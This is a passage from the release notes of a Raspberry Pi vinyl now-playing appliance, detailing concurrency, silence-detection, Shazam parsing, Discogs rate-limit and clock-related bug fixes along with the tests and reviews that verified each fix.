  (run_pipeline didn't own the pool's shutdown); the shutdown call, its
  `cancel_futures`/`wait` flags, and the `set_default_executor` routing are each
  mutation-pinned (the routing via a new `install_io_executor` extracted for
  testability); cold review SPEC / QUALITY PASS — routing, drain-then-close
  ordering, double-shutdown idempotence, and no closed-pool dispatch all
  execution-verified. The owned pool is sized to the interpreter default's width
  (8) rather than narrower, so the recognition-hot-path WAV encode is never queued
  behind a burst of slow network I/O.
- **A tracker fault on SESSION_ENDED can no longer strand the now-playing card
  (CRIT-5, #99 — MEDIUM).** The silence-event handler was a SINGLE Signal listener
  doing two independent effects — `tracker.on_silence_event(event)` then, for
  SESSION_ENDED, `state.clear()`. `Signal.emit` is log-and-continue, which
  protects listeners from EACH OTHER but not the second half of one listener from
  the first: a raise in `tracker.on_silence_event` skipped `state.clear()`, so the
  B-1 session epoch never bumped and the now-playing card stayed on screen with
  only a log line in a journal nobody reads. It is now split into two separately
  registered listeners (via a new `wire_silence_listeners`, extracted for
  testability) — the player-state effect (`apply_state_silence_effect`) and the
  tracker's `on_silence_event` — so the Signal's log-and-continue applies BETWEEN
  them: a fault in either half can't skip the other. The state listener is
  registered first, honoring the finding's "clear before scheduling the tracker
  end"; that ordering is otherwise a no-op (post-CONC-2 the tracker's session
  detach runs in the `_end_session` task it schedules, which fires only after the
  synchronous emit unwinds, so the epoch bump is synchronous in either order) — a
  comment that over-claimed a concurrency benefit here was corrected after cold
  review. RED-first (the stranded-card fault reproduced); the split, the
  listener order, and the state effect are each mutation-pinned (reverting to the
  single combined listener is killed by the fault test); cold review SPEC / QUALITY
  PASS, verifying fault isolation both directions, every AudioEvent still reaching
  the tracker, and no new race with CONC-2/CONC-6.
- **A hung recognition call can no longer occupy the loop for minutes (PCONC-2,
  #100 — MEDIUM).** `RecognitionLoop.run()`'s only `wait_for` guarded the audio-
  queue `get()`, not `backend.recognize()` — and shazamio's default retry policy
  is `attempts=20 × max_timeout=60`, so a single degraded call over flaky Pi wifi
  could run for minutes, saturating the maxsize-5 audio queue until the consumer
  worked on 40–50s-old audio (the lag PCONC-1 needs). `recognize()` is now wrapped
  in its own `asyncio.wait_for`: a timeout cancels the call (a BaseException the
  backend's `except Exception` can't swallow) and surfaces as a `TimeoutError` to
  CONC-4's handler (logged + backed off; the next chunk retries). The bound is a
  DEDICATED `recognize_timeout` (30s ≈ 3× the chunk hop cadence), deliberately
  NOT `poll_interval` — cold review showed reusing the idle-poll timeout would let
  a low `poll_interval_seconds` silently cap every real Shazam round-trip and
  latch the display to ERROR. shazamio's retry policy is also pinned explicitly
  (`Shazam(http_client=HTTPClient(retry_options=ExponentialRetry(attempts=2,
  max_timeout=5, statuses={500,502,503,504,429})))`) — `attempts=2` is the
  operative bound (`max_timeout` is aiohttp_retry's backoff cap, pinned low only
  so we never inherit the 60s default; `run()`'s `wait_for` is the hard backstop
  for a hung request). RED-first (the hung call reproduced occupying the loop);
  the `wait_for`, the timeout value's decoupling from `poll_interval`, the
  pinned retry attempts/statuses, and the non-empty (`repr`) timeout log are each
  mutation-pinned; cold review SPEC / QUALITY PASS and a narrow second pass over
  the reviewer-prompted rework verified the decoupling, cancellation cleanup, and
  no session leak (shazamio builds its aiohttp session per-request).
- **A Shazam JSON null in a string field no longer stalls the display forever
  (REC-2, #101 — MEDIUM).** `_parse_shazam` read `subtitle`/album metadata with
  `.get(key, "")`, which returns `None` (not the default) when the key is present
  with a JSON null — Python's `dict.get` only falls back to the default on a
  MISSING key. So a `{"title": "…", "subtitle": null}` response parsed cleanly to
  `artist=None`; `_same_track` then called `artist.strip()` and raised
  `AttributeError` inside `_handle_result` — OUTSIDE `recognize()`'s try, so it
  escaped to `run()`'s handler (log.error + sleep) with NO miss counted, leaving
  the display stuck on the IDENTIFYING spinner indefinitely while the journal
  filled once per chunk. (REC-3 had already coerced the title read, closing that
  half.) Every string field the parser reads and later feeds to a string method
  is now coerced with `… or ""` — `subtitle`→artist, the album-metadata `title`
  (a null would crash `.lower()`) and `text` — and `_same_track` guards all four
  of its reads (`(a.title or "").strip()…`) as defense-in-depth. RED-first (the
  stall and both null crash paths reproduced); each coercion and each `_same_track`
  guard is mutation-pinned; cold review SPEC / QUALITY PASS, confirming the stall
  is closed (a miss is now counted) with no behavior change on non-null values and
  REC-3's titleless rejection intact. A sibling, safe-degrading class the review
  surfaced — JSON-null CONTAINERS (`sections`/`metadata`) that crash the parser's
  iteration but are caught by `recognize()` and degrade to a miss, not the stall —
  was filed separately (#167) rather than folded in.
- **The `session_end_silence_seconds` knob now measures from when the silence
  actually began, so 45s no longer means 60-70s (SIL-1, #102 — MEDIUM).** A chunk
  is a `chunk_seconds` (15s) *trailing* RMS window emitted every hop
  (`chunk_seconds - overlap_seconds` = 10s), so the first fully-below-threshold
  chunk lands 15-25s after the needle actually lifted — yet `_silence_since` was
  armed at the moment that late chunk was *processed*. The configured 45s was
  therefore measured from a point ~15-25s too late: a needle lift at t=60.25s
  fired SESSION_ENDED at t=130.0s (69.75s latency, 55% over the documented value),
  delaying the Discogs play-count credit and the return to IDLE, and making the
  knob impossible to tune meaningfully. The music→silence transition now back-dates
  the timer to `now - chunk_seconds` — the start of the trailing window, where the
  silence genuinely began. This removes the whole `chunk_seconds` component; an
  up-to-one-hop residual remains because detection is still sampled on the chunk
  grid (so a 45s threshold now fires at ~45-55s, not exactly 45s) — that residual
  is documented honestly in `config.example.yaml` and in-code rather than papered
  over, since removing it would require sub-chunk RMS sampling (out of scope). The
  `reset_music_state` (B-6 outage-recovery) arming is deliberately left at bare
  `now`: after a stall of unknown duration there is no window to back-date to, and
  a cold-review attack on that asymmetry confirmed the two sites model different
  physics and cannot corrupt each other. RED-first (a white-box test pinning the
  armed value plus a corrected-deadline SESSION_ENDED test, both red on today's
  code); four mutants — revert the back-date, flip its sign, zero the window,
  swap in the wrong attribute — all killed, the white-box test firing on every
  one; cold review SPEC / QUALITY PASS with an executed reproduction confirming the
  latency drop (130.0s → 115.0s in the finding's own scenario) and no premature or
  wrong-chunk fire even when `session_end < chunk_seconds`. The review also surfaced
  a *pre-existing* gap it labeled out of scope — `session_end_silence_seconds`
  accepts `0`/negative because CRIT-1's value-domain sweep missed it — filed
  separately (#168) rather than folded into this fix.
- **A crash loop can no longer pin the Discogs API in 429 territory by re-paging
  the whole collection every 10 seconds (STAB-4, #103 — MEDIUM).**
  `_get_collection_index` walked the collection in an unbounded `while True` whose
  only exits were an empty page or `page >= pagination.pages`, and cached the
  result in memory only — so every process start rebuilds it from zero. Paired with
  the documented unit's `Restart=on-failure` / `RestartSec=10`, a persistent crash
  (a config that survives validation, a wedged dependency) becomes a permanent
  hammer: a 1,000-record collection re-pages ~10 GETs every 10s = 60 GETs/min,
  which *is* the authenticated rate limit, so the appliance sits permanently at
  429 — each 429 also sleeping up to 10s in a shared executor worker. Two bounded,
  low-risk brakes (the disk-cache remedy was deliberately deferred — see below):
  an **absolute page cap** (`_MAX_COLLECTION_PAGES = 1000` = 100,000 releases, far
  above any real personal collection) stops a malformed/hostile `pagination.pages`
  (or a logic bug) from paging without end — it breaks with the partial index and
  still caches it, so it is not re-hammered per track, and a partial index can only
  cause false-negatives, never a wrong write target (the truncated entries still
  pair each `release_id` with its own `instance_id`); and
  **`StartLimitIntervalSec=300` / `StartLimitBurst=5`** on the systemd `[Unit]`
  tells systemd to stop retrying after more than 5 starts in 300s, dropping the
  unit into a `failed` state (`start-limit-hit`) so a genuinely broken boot goes
  quietly dark instead of pinning the API. Both mechanisms reproduced first (the
  unbounded loop ran past 5,000 pages; a fresh reader re-paged the full 10 GETs on
  every simulated restart); RED-first; five mutants — disable the cap, off-by-one,
  cap-too-low, cap-too-high, fire-but-never-terminate — all killed; cold review
  SPEC / QUALITY PASS, which independently verified end-to-end that a partial index
  reaches the writer only as `instance_id=None` (no wrong write) and that the
  `[Unit]` placement is valid for every Raspberry Pi OS systemd (≥ v229). The
  finding's third remedy — **disk-persisting the index with a TTL** — was
  deliberately NOT taken here: it does not stop the crash loop (a crash before the
  build never touches the cache; the loop still hammers systemd) and it would add a
  stale/corrupt on-disk `instance_id` as a new write-target vector — exactly the
  class Wave 1 spent 16 issues closing — so it is filed as its own efficiency issue
  (#169) rather than ridden in on a hardening fix.
- **A first-boot display or cache-dir failure now prints an actionable remedy
  instead of a bare traceback (ARCH-10, #104 — LOW).** `main()` guarded only
  `load_config()`; component construction and `display.start()` were bare. On the
  Pi's first power-on — the app has never run on real hardware — the two most
  probable failures surfaced as stack traces naming no fix: `display.start()` →
  `pygame.error` ("No available video device") when HDMI isn't detected or X isn't
  up on `:0`, and construction → `OSError` from `CoverArtCache.__init__`'s
  `mkdir` when `display.cover_art_cache_dir` isn't writable. Both are now wrapped:
  construction moved into `build_components(config, state)` and the display init
  into `start_display(display)` (extracted, like the T-1 helpers, so both are
  unit-testable), each logging one concrete operator message — the cache-dir
  setting to check, or the HDMI/`DISPLAY`/X checks and the `Environment=` lines in
  the systemd unit — pointing at a new "Display / startup won't initialize" section
  in `docs/first-boot-checklist.md`, then **re-raising** so the process still exits
  non-zero (systemd handles it, bounded by STAB-4's `StartLimitBurst`). Both
  failure modes reproduced first (a `NotADirectoryError` from the mkdir and a
  `pygame.error` from `set_mode`, neither carrying any remedy); RED-first; six
  mutants — each guard's re-raise and log-level, plus a dropped and a mis-wired
  bundle field — all killed; cold review SPEC / QUALITY PASS, which independently
  re-verified that the extraction preserved every wiring identity (the shared A-4
  `discogs_http`, `commit_service.commit` reaching the recognizer, the tracker
  wired into the silence listeners equalling the one handed to `run_pipeline`), that
  both guards re-raise the original exception (never swallow), that
  `KeyboardInterrupt`/`SystemExit` still propagate uncaught, and that the I/O
  executor is not leaked on the abort path. Two LOW nits it raised were fixed in
  place: an inaccurate "missing parent directory" hint (an auto-created parent is
  not a failure cause) and a non-None-only bundle assertion tightened to per-field
  type checks. A pre-existing, benign resource nit it surfaced — `discogs_http`'s
  dedicated pool isn't explicitly closed when startup aborts before `run_pipeline`
  (atexit still joins the idle threads; no hang) — was filed separately (#170).
- **A crash in the fire-and-forget end-of-session credit is now logged, not
  swallowed into a detached GC warning (CONC-3, #105 — LOW).** The SESSION_ENDED
  credit runs as a fire-and-forget `asyncio` task, and its done-callback was a bare
  `self._bg_tasks.discard` — it dropped the strong reference but never retrieved
  `task.exception()`. Most write failures inside the credit path are already caught
  and bounded-retried (`_finalize_write_with_retry`, #163), but a path that RAISES
  rather than returning False — most concretely a raising `update_last_played`, or
  any unexpected error — propagated out of `_end_session` into nothing: the only
  trace was asyncio's `Task exception was never retrieved`, emitted from the garbage
  collector at an arbitrary later time and detached from the SESSION_ENDED that
  caused it, so the operator saw no error in the same log that records every other
  write outcome. The callback is now `_on_end_session_done`, which discards the
  reference AND retrieves the exception, logging one ERROR naming the failure when
  the task raised — guarding `task.cancelled()` first, because shutdown/loop
  teardown can cancel an in-flight credit (which `drain` already warns about) and
  calling `.exception()` on a cancelled task itself raises `CancelledError`.
  RED-first (a raising `update_last_played` reproduced the swallow — a detached GC
  warning, no operator-visible ERROR); five mutants — revert to the bare discard,
  downgrade the log level, drop the reference-cleanup, drop the cancelled guard,
  invert the has-exception check — all killed; cold review SPEC / QUALITY PASS,
  which empirically confirmed the `.exception()` retrieval suppresses the detached
  GC warning (1 → 0), that the success path is unchanged (unconditional discard,
  silent), and that there is no double-log against `drain`. This is a VISIBILITY
  fix: the finding explicitly accepts that the session's Last Played / Last.fm love
  are skipped when a write raises after the Play Count landed, and asks only that
  the failure be surfaced. A pre-existing seam the review noted in passing — the
  "love runs independently of a Discogs failure" comment holds when a write returns
  False but not when it RAISES (the raise short-circuits the love block) — was filed
  separately (#171) rather than folded in.
- **A NaN (or inf) in an audio window no longer fakes a needle lift mid-record
  (SIL-2, #106 — LOW).** `process()` computed `rms = √mean(audio²)` and compared
  `rms >= threshold` with no finiteness guard. A single NaN sample out of the
  ~661,500 in a 15s window poisons `np.mean`, making `rms` NaN — and `nan >= x` is
  False in IEEE-754, so the whole chunk fell through to the SILENCE branch: it
  flipped `_is_music` to False, armed `_silence_since`, and emitted a false
  MUSIC_STOPPED. Because the wall-clock ticker evaluates the end-of-session timer
  independently of chunk flow, a NaN burst ~45s before a side ends could fire
  SESSION_ENDED early — clearing the now-playing card and (downstream) crediting an
  unfinished side. An `inf` is the mirror (`inf >= threshold` is True) and would
  fake MUSIC_STARTED. The fix guards the aggregate: `if not math.isfinite(rms)`,
  log a warning and RETURN before any state change or `time.monotonic()` read — a
  corrupt chunk is evidence of neither silence nor music, so it is skipped and the
  next clean chunk drives detection. RED-first (a one-sample NaN reproduced the
  fake silence; an inf the fake music start); three mutants — disable the guard,
  invert it, log-without-return — all killed (the cold review additionally verified
  an `isnan`-only and an `isinf`-only partial guard each fail one test, so both
  finiteness directions are pinned); cold review SPEC / QUALITY PASS, which
  confirmed the skip leaves `_is_music` / `_silence_since` / `_session_ended`
  untouched, that a genuine end-of-session still fires via the ticker and the
  level-triggered `_check_session_end` (a NaN coinciding with a real needle lift
  costs at most the already-documented SIL-1 one-hop latency, never a lost
  transition), and that an overflow-to-`inf` cannot arise from normalized float32
  capture. A persistently all-NaN stream — a severe driver fault, not a stall — now
  stays in the music state rather than firing a false SESSION_ENDED (the intended
  consequence); a permanently corrupt input is a hardware fault outside the
  detector's remit.
- **The silence detector no longer flaps when the RMS hovers at the threshold
  (SIL-4, #107 — LOW).** A single threshold with no dead band meant an RMS
  oscillating right at the boundary produced an unbounded MUSIC_STARTED/MUSIC_STOPPED
  alternation — the finding measured eight events from a 0.000002 amplitude swing
  (0.010001 / 0.009999). Each return to music cleared `_session_ended` and each drop
  re-armed `_silence_since` from scratch, so a signal sitting at the boundary could
  churn indefinitely and hold SESSION_ENDED off, never crediting the finished side.
  The fix adds **hysteresis**: `process()` now branches on the current state —
  music is *entered* at `silence_threshold_rms` but only *left* once the RMS falls
  below `_MUSIC_EXIT_RATIO` (0.5) × that threshold. An RMS in the dead band
  `[½·threshold, threshold)` holds whichever state is current instead of flapping,
  with no added transition latency. The tradeoff, documented in
  `docs/first-boot-checklist.md` §2: hysteresis lowers the *effective* silence bar
  to half the threshold, so the run-out / room noise floor must sit below that for
  SESSION_ENDED to fire — the operator tunes `silence_threshold_rms` to comfortably
  more than 2× the noise floor. (This is a first-boot tuning note, not an upgrade
  hazard: the appliance has never run on the Pi, so the threshold is tuned for the
  first time with this guidance present.) RED-first (the flap reproduced, plus the
  dead-band hold); five mutants — ratio 1.0 (dead band collapses), ratio 0.0 (music
  never left), leave-on-the-enter-threshold, enter-on-the-exit-threshold, inverted
  comparison — all killed; cold review SPEC / QUALITY PASS, which independently
  reproduced the flap now gone, confirmed the restructure preserved the SIL-1
  back-date, the SIL-2 non-finite guard, the wall-clock ticker, and
  `reset_music_state`, and measured the dead-band tradeoff (judged acceptable and
  documented). A doc-precision nit it caught — the tuning target had landed exactly
  on the strict-`<` exit boundary — was fixed in the checklist wording.
- **A state change delivered without a running event loop can no longer raise out
  of the display layer (DISP-8, #108 — NIT).** `_on_state_change` is a synchronous
  `PlayerState` callback that scheduled a cover-art prefetch via
  `self._spawn(self._prefetch_cover(url))` → `asyncio.create_task` — UNGUARDED —
  while the corrupt-cover re-fetch path (`_handle_corrupt_cover`) wrapped the
  identical call in an explicit `asyncio.get_running_loop()` / `except RuntimeError`
  guard precisely because it can run without a loop. The two call sites disagreed;
  if a state change is ever delivered from an executor thread or before the loop
  starts, `create_task` raises `RuntimeError('no running event loop')` out of the
  renderer's callback and back into the notifying recognition pipeline, which does
  not expect the display layer to raise. The guard now lives in `_spawn` — the
  single `create_task` site — so every caller is protected once: off-loop it closes
  the un-started coroutine (so it can't warn about never being awaited) and returns
  None, on-loop it schedules and tracks the task exactly as before. The redundant
  duplicate guard at `_handle_corrupt_cover` was removed. RED-first (an off-loop
  `_on_state_change` reproduced the `RuntimeError` leaking into the caller); three
  mutants — disable the guard, drop the `coro.close()`, drop the early return —
  all killed; cold review SPEC / QUALITY PASS, which verified both directions,
  that constructing-then-closing the coroutine is behaviorally identical to never
  constructing it (an `async def` body runs nothing until awaited), that the two
  `_spawn` sites are the only schedulers and both pass a fresh coroutine, and that
  the STAB-1 / B-18 bounded-refetch behavior is unchanged.

## [1.5.2] — 2026-08-03

**Code-review hardening, round 3 (Wave 1 — collection data integrity).** A third
adversarial cold audit (`CODE_REVIEW_2026-07-30.md`) filed 88 issues across five
milestones; this release lands the Wave 1 (collection data-integrity) fixes — the
one irreversible wave, shipped before the Pi is powered on — each through the same
implement → RED test → mutation-check → cold-review discipline.

### Fixed

- **A failed or untrusted read no longer resets the Play Count to 1 (META-1,
  #75 — CRITICAL).** `increment_play_count` is a read-modify-write ending in an
  absolute set. `_get_field_value` previously returned `None` for *every* read
  failure — a non-200, a network exception, or a 200 whose body did not contain
  the instance — which the caller could not tell apart from a genuinely blank
  field, so it treated the value as `0` and POSTed an absolute `1`, silently
  overwriting an accumulated count and logging success. `_get_field_value` now
  returns a three-state result — the value, `None` for a *confirmed-blank* field
  (safe `0`), or the `_READ_FAILED` sentinel for an *untrusted* read — and
  `increment_play_count` aborts (no POST, returns `False`) whenever the current
  value cannot be trusted.
- **A present, non-integer Play Count is no longer overwritten with 1 (META-2,
  #77 — HIGH).** A successful read that returns a non-integer value is real data
  that cannot be safely incremented; the increment now aborts and leaves the
  field untouched rather than clobbering it with an absolute `1`. Whitespace-only
  and empty values are still treated as a blank `0` (first play → `1`); the
  B-16 JSON-number coercion (`5` → `6`) is preserved.
- Both aborts log at ERROR with a distinct message, and the two guards are pinned
  independently by log-message assertions so neither can be removed unnoticed.

### Tests

- **Pinned `_get_collection_fields` — the field-name → field-ID map that selects
  which Discogs column a write lands in (MUT-1, #79).** Every writer test
  previously pre-seeded `writer._collection_fields`, so the fetch/build path had
  zero test executions and a mutation could silently reverse the name→id mapping
  (writing to the wrong column) with the suite still green. Added tests
  exercising the real fetch: the endpoint URL, the name→id direction, caching,
  HTTP-error propagation, and an end-to-end check that the resolved field-ID is
  the one that lands in the write URL. `writer.py` is now at 100% line coverage,
  and the five previously-surviving mutants there are killed.
- **An incomplete recognition no longer writes to an arbitrary owned record
  (SEC-1, #76 — HIGH).** `search_collection`'s strategy-2 fuzzy match used a bare
  substring test (`album_lower in title and any(artist_lower in a …)`). An empty
  Shazam album or artist — or even a single space, which is a substring of most
  titles — made that test vacuously true, so it returned the most-recently-added
  owned release, whose `instance_id` then became the Play Count / Last Played
  write target: a junk match became a wrong write to real collection data.
  `search_collection` now returns `None` when the artist or album is empty or
  whitespace-only, so the track resolves via the database/fallback tiers (no
  `instance_id`, no write) instead of crediting a play to the wrong record. The
  intentional substring fuzz (which catches reissues like "The Wall" vs "The Wall
  (Remastered)") is preserved, and legitimately short titles ("4", "Q") still
  match — only empty/whitespace terms are rejected.
- **A titleless Shazam response no longer confirms as a real track (REC-3, #81 —
  HIGH).** `_parse_shazam` built a `RawRecognitionResult` even when the `track`
  object had an empty, missing, or `null` title, so two such junk responses
  matched each other, reached `confirmation_required`, and were committed
  (resolved, displayed, and — before SEC-1 — a wrong-collection-write risk). The
  title is the track's identity, so `_parse_shazam` now returns `None` when it is
  empty/whitespace/missing/null, and the recognition loop counts it as a miss.
  A title-only track (no artist) is still a valid partial match. As a side
  effect this also resolves the `title: null` half of REC-2 (a null title no
  longer reaches — and crashes — the dedup comparison); the null-*artist* half
  remains tracked separately under REC-2.
- **Shutdown no longer tears an in-flight end-of-session credit in half
  (CONC-1, #76 — HIGH).** The end-of-session Play Count / Last Played write runs
  as a fire-and-forget task in the tracker's `_bg_tasks`; it is not one of the
  three pipeline legs, so nothing awaited it. A SIGTERM or ESC a second or two
  after a needle-lift let `asyncio.run` cancel it mid-write — `increment_play_count`
  had run but `update_last_played` and the Last.fm love had not, and because
  `_finalize_session` latches `credited` before the first await, nothing retried
  it: the collection was left permanently half-updated, silently. `ListenTracker`
  gained a bounded `drain()` that `run_pipeline` now awaits in its `finally`
  (before stopping capture/display, and even when a leg faulted), so an in-flight
  credit finishes. Bounded by `_SHUTDOWN_DRAIN_SECONDS` (10s) so a stuck write
  can't hang shutdown past systemd's stop timeout.
- **A duplicated Discogs position string no longer credits a phantom play
  (META-4, #78 — HIGH).** `SideIndex.is_last_track` — the sole gate on the
  end-of-side Play Count / Last Played write — compared the current track's
  position string to the last entry's. Discogs positions are community-edited
  free text and not guaranteed unique, so a mid-album track that merely *shared*
  the closer's position string ("B2") was flagged the last track and credited a
  play for a side that never finished. `is_last_track` is now derived from the
  already-computed, position-AND-title-disambiguated `global_index`, so only the
  genuine final entry credits. The deliberately conservative reprise behavior (a
  closer whose title is duplicated earlier resolves to the first occurrence and
  is *not* credited — a missed play rather than a phantom one) is preserved; a
  20,000-tracklist differential fuzz confirmed the change only ever removes
  phantoms, never flips a correct result.
- **A queue-lagged audio chunk no longer commits a dead track into a fresh
  session (PCONC-1, #80 — HIGH).** The epoch guard sampled the session token at
  `TrackCommitService.commit` *entry* — after the audio was captured, queued, and
  confirmed. A chunk captured while a record played can sit in the recognition
  queue (maxsize 5) past a needle-lift (`clear()` bumps the epoch); once a new
  session begins it is dequeued, confirmed, and committed — and the entry-time
  sample reads the *new* epoch, finds it stable across the resolve, and writes the
  previous record's track onto the screen and, downstream, into the Discogs
  collection. The epoch is now bound to the audio at `enqueue` (≈ capture) time,
  travels with the chunk through recognition, and is passed to `commit` as a
  required `audio_epoch`; a commit whose audio predates the live session is
  discarded. This closes the queue-lag window the mid-resolve guard (B-1) never
  covered, while preserving the mid-resolve (B-1) and tracker-tail (B-19) checks
  exactly — all three now validate against the audio's own epoch rather than a
  commit-time re-sample. Reproduced RED at the commit boundary; the epoch
  threading is mutation-verified (a dequeue-time re-read, a dropped epoch, a
  constant-epoch enqueue, and a re-sample-at-entry mutant are all killed).
- **The systemd unit now waits for a synced clock and an up network before
  starting (CRIT-4, #83 — the root cause behind the unset-clock date
  corruption).** The documented `vinyl-now-playing.service` ordered only on
  `network.target` (the network stack is *configured*, not up) with nothing
  waiting on the clock. The Pi has no battery-backed RTC, so the app could start
  with a stale `fake-hwclock` time and stamp wrong **Last Played** dates into the
  Discogs collection before `systemd-timesyncd` synced over the network. The unit
  now orders `After=network-online.target time-sync.target graphical.target` with
  `Wants=network-online.target`, and `docs/pi-setup-guide.md` adds the two steps
  that give that ordering teeth: enabling `systemd-time-wait-sync.service`
  (without it, `time-sync.target` can be reached *before* the clock is set — a
  documented systemd behavior with plain `timesyncd`) and setting the timezone
  via raspi-config (covers VNEW-1). This is the deployment-side root-cause fix;
  the defensive writer-side clock gate (STAB-2, #86) is complementary and tracked
  separately.
- **A tracker exception no longer strands a confirmed track (LB-1, #84 —
  MEDIUM).** `TrackCommitService.commit` advanced the dedup key (`set_raw`)
  *before* awaiting `tracker.on_track_identified`. The B-11 ordering invariant
  guarded against a *resolver* failure but not a *tracker* one: if
  `on_track_identified` raised — its album-split path awaits a Discogs write —
  the exception propagated to `run()` while `current_raw` had already advanced,
  so the recognition loop's dedup treated the never-recorded track as "already
  playing" and never re-attempted it. The track was displayed but never tracked,
  never scrobbled, and never retried. `set_raw` now runs *after*
  `on_track_identified` succeeds, so a tracker exception leaves `current_raw`
  un-advanced and the loop re-commits on the next chunk (a transient failure
  self-heals — the track is then both tracked and scrobbled; no double-scrobble,
  since the scrobble sits after `set_raw`). Moving `set_raw` past the tracker
  await also opened a needle-lift window, so the advance now shares the same
  epoch guard as the scrobble (B-19): a SESSION_ENDED *during* the tracker call
  can't resurrect a dead session's dedup key. Reproduced RED; the reorder and the
  guard are both mutation-verified. B-11 still holds (set_track runs first).
- **Removed an unreachable duplicate-position fallback in
  `SideIndex.from_tracklist` (MUT-15, #85 — test effectiveness).** The finding
  flagged surviving mutants on the `global_index` fallback ("if two rows share a
  position string and neither matches the title, use the first position match").
  Measured rather than assumed: that branch is *provably unreachable* —
  `target_position` is always derived from a title-bearing entry, so a row
  matching BOTH the position and the title always exists and the loop never falls
  through (a differential fuzz of ~1.9M cases plus 1M reachability probes found 0
  fall-throughs and 0 behavior differences vs. the old code). The three surviving
  mutants were therefore *equivalent* — they only mutated a variable nothing
  consumed — and unkillable by any test. So instead of testing an impossible
  state (the finding's literal suggestion), the dead fallback was removed,
  eliminating those mutants at the source, and the *reachable* duplicate-position
  behavior (resolve by position AND title, not the first row at that position) is
  now pinned by a real test. Behavior-preserving; no production behavior change.
- **A pre-NTP clock no longer stamps a wrong Last Played date or scrobble
  timestamp over real data (STAB-2, #86 — MEDIUM).** The Pi has no RTC; a boot
  before NTP settles reads the Unix epoch or a stale `fake-hwclock` date.
  `update_last_played` wrote `date.today().isoformat()` as an absolute set with no
  clock check, so a pre-NTP side-completion POSTed e.g. `1970-01-01` over the
  correct Last Played value in the real collection (and logged success), and the
  scrobble submitted an epoch/stale timestamp that Last.fm silently drops or
  mis-places. A new `src/util/clock.py` gate (`clock_is_trustworthy`, a
  compiled-in 2026-01-01 floor) now guards both date-dependent writes: a pre-NTP
  boot skips the Last Played write and the scrobble with a WARNING rather than
  writing a wrong value, and re-attempts on the next play once the clock syncs.
  Play Count is deliberately NOT gated — it writes a count, not a date, so a wrong
  clock can't corrupt it. This is the code-level complement to the
  deployment-level CRIT-4 (#83): the systemd unit already waits for
  `time-sync.target`, so a correctly-deployed appliance never runs before sync;
  this gate is defense-in-depth for the manual-run / mis-deployed case and the
  catastrophic epoch reading. (The floor is a lower bound — a stale-but-post-floor
  clock is a documented residual the deployment sync covers.) A deliberate
  clock-skip is not mislabeled as a failure by the tracker's finalize log.
  RED-reproduced (a 1970 POST over the real field); the gate and both call-site
  guards are mutation-verified; cold review + a narrow second pass both PASS.
- **A stale commit no longer resurrects a dead session as a phantom (CONC-6, #87
  — LOW).** The commit epoch guard covered the resolve await but not the
  `on_track_identified` await. That await can park on the tracker's contended
  `_lifecycle_lock` (a previous session's Discogs write holds it); a SESSION_ENDED
  landing in that window ends the session and bumps the epoch, and the tracker
  would then acquire the lock, see `_session is None`, and start a PHANTOM session
  for audio that already stopped — which a later album split could phantom-credit
  (and a FALLBACK track with no release_id can't split away to clean up). `commit`
  now hands `on_track_identified` a staleness predicate
  (`is_stale=lambda: state.session_epoch != audio_epoch`, using PCONC-1's
  audio-bound epoch); the tracker re-checks it *after* acquiring the lock and drops
  the stale track — starting no session, logging nothing — rather than resurrecting
  it. No false-drop: an album-swap split isn't a silence event and doesn't bump the
  epoch, so a live track is never dropped. Mutation-verified; a real-lock cold-review
  reproduction confirmed the phantom forms pre-fix and is dropped after.
- **A persistent Discogs 429 is now a distinct, loud outcome instead of a silent
  lost credit (META-10, #88 — LOW).** The transport retried a 429 once after
  sleeping the server's `Retry-After`, clamped to a 10s cap — so when Discogs
  answers `Retry-After: 60` the retry landed back inside the same throttle window
  and 429'd again, and the caller then logged a generic failure and returned
  `False`, dropping the completed side's Play Count credit with nothing to
  distinguish it from any other error. The cap stays (`request()` runs on the
  shared executor pool; a long sleep starves cover fetches / scrobbles — P-2). Now
  a `Retry-After` **beyond** the cap skips the futile retry entirely — no wasted
  sleep, no second request hammering Discogs mid-backoff — and logs a distinct,
  loud ERROR naming the lost-credit consequence; a retry that is **still** 429 logs
  the same distinct ERROR rather than a generic failure. Actually waiting out a
  long `Retry-After` so the write can still land (recovery) needs Discogs off the
  shared pool and is deferred to the dedicated executor (#61). The read path still
  returns `_READ_FAILED` on 429, so META-1's abort is unaffected, and B-15 POST
  opt-in retry semantics are preserved. Mutation-verified (incl. the `>`/`>=`
  boundary); cold review SPEC / QUALITY PASS.
- **A partial Discogs write now logs one explicit divergence line instead of two
  unrelated warnings (META-7, #89 — LOW).** The end-of-album credit is two
  independent POSTs — Play Count, then Last Played — against a 60 req/min API, and
  the session is destroyed right after. If exactly one lands (a 429 on the second
  POST is the obvious case), the collection item is left inconsistent — count
  incremented but date stale, or the reverse — with nothing to retry it until the
  record plays again. Each write already logged its own warning, but the two
  didn't say they belonged together. `_finalize_session` now emits a single
  `DIVERGED` warning naming the release/instance and stating which side landed and
  which did not, in both directions. A deliberate STAB-2 clock-skip of Last Played
  (a pre-NTP boot defers rather than fails, and has already WARNed) is excluded via
  a trustworthy-clock gate so the line does not cry wolf on every album finished
  before NTP sync; genuine post-sync failures (a 429, a dropped connection) run on
  a trustworthy clock and still fire. Log-only — no new writes to the collection.
  RED-first; both disagreement directions mutation-pinned (the XOR, the clock gate,
  and each message operand); cold review SPEC / QUALITY PASS after adding the
  reverse-direction `(F,T)` test the first pass flagged as an unpinned branch.
- **The account username is percent-encoded in every Discogs collection URL
  (SEC-7, #90 — NIT).** Every numeric id in a write path is hardened through
  `_as_id`, but the operator-authored `username` (from `config.yaml`) was
  interpolated raw into all five `/users/{username}/collection…` paths — four in
  the writer (increment POST, Last Played POST, fields GET, field-value read GET)
  and one in the reader's collection index. A username containing a URL-reserved
  character — `/`, `?`, `#`, a space — silently reshaped the request path (extra
  segments, a stray query string, a fragment) rather than failing. Both classes
  now compute `quote(username, safe="")` once at construction and use that single
  encoded segment at every URL site; `self.username` stays raw for
  identity/logging. Not an attack surface (the value is operator-authored) — a
  robustness fix — and it incidentally tightens log hygiene: `_redact_url` masks
  the encoded username as one segment, whereas a raw `a/b…` previously leaked the
  `b` as a separate, unmasked path segment. RED-first; all five sites plus the
  encode and the `safe=""` parameter mutation-pinned; cold review SPEC / QUALITY PASS.
- **Discogs blocking calls run on a dedicated executor, isolated from cover art
  and Last.fm (#61 — MEDIUM).** Every Discogs reader/writer call — and the 429
  backoff `time.sleep()` inside `request()` — used to run on the SHARED default
  `run_in_executor(None, …)` pool that also serves cover downloads and Last.fm
  scrobbles/loves, so a rate-limit sleep parked a worker those tasks needed (P-2,
